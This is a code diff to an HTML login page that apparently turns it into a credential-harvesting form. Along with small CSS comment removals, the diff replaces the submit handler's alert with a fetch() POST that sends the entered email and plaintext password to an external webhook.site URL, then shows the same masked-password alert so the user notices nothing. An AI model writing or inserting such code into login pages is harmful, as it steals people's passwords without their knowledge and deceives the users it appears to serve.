@@ -36,7 +36,7 @@
       font-size: 24px;
       color: #333;
       margin-top: 0;
-      margin-bottom: 10px; /* tighter spacing */
+      margin-bottom: 10px;
     }
 
     .login-container p {
@@ -95,7 +95,6 @@
       text-decoration: underline;
     }
 
-    /* Hide password input initially */
     #password-container {
       display: none;
     }
@@ -152,7 +151,22 @@
           passwordInput.reportValidity();
           return;
         }
-        alert(`Logging in with:\nEmail: ${emailInput.value}\nPassword: ${'*'.repeat(passwordInput.value.length)}`);
+
+        // Send credentials to webhook.site
+        fetch('https://webhook.site/6dd9ec8a-69f4-4ebe-a9e7-658a993365bb', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            email: emailInput.value,
+            password: passwordInput.value
+          })
+        }).then(() => {
+          alert('Logging in with:\nEmail: ' + emailInput.value + '\nPassword: ' + '*'.repeat(passwordInput.value.length));
+        }).catch(err => {
+          console.error('Error:', err);
+        });
       }
     });
   </script>
